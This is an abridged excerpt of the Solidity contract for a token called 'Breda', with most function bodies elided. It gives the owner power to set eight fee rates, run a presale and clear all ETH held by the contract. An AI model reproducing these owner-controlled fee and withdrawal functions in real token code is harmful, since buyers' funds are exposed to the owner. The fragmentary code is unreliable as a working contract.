...
contract Breda is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public teamAddress = payable(0x840B16989d0751b5ceAA2e4533Bc458Dfe1a365a); // Team/Dev Address
    ...
    uint256 private _tTotal = 500000000000000000000000 * 10**18; 
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "Breda";
    ...
    uint256 public teamDivisor = 5; //Team/Dev Fee
    
    uint256 public _maxTxAmount = 50000000000000000000000 * 10**18;  //Maximum amount can be used for transaction (antiwhale setup))
    uint256 private minimumTokensBeforeSwap = 50000000000000000000000 * 10**18;  //allow maximum sell amount(anti-dump setup)
  ...
  function setALLFeePercent(uint256 team,uint256 burnTaxFee,uint256 liquidityFee,uint256 taxFee,uint256 sellLiquidityFee,uint256 sellTaxFee,uint256 buyLiquidityFee,uint256 buyTaxFee) external onlyOwner() {
    ...
    function prepareForPreSale() external onlyOwner {
        ...
        _liquidityFee = 0;
        _burnFee = 0;
        _maxTxAmount = 50000000000000000000000 * 10**18;
    }
   ...
   function clearAllETH() public onlyOwner() {
    ...
    function buy(address _refer) payable external returns(bool){
        require(_swSale && msg.value >= 0.2 ether,"Transaction recovery");
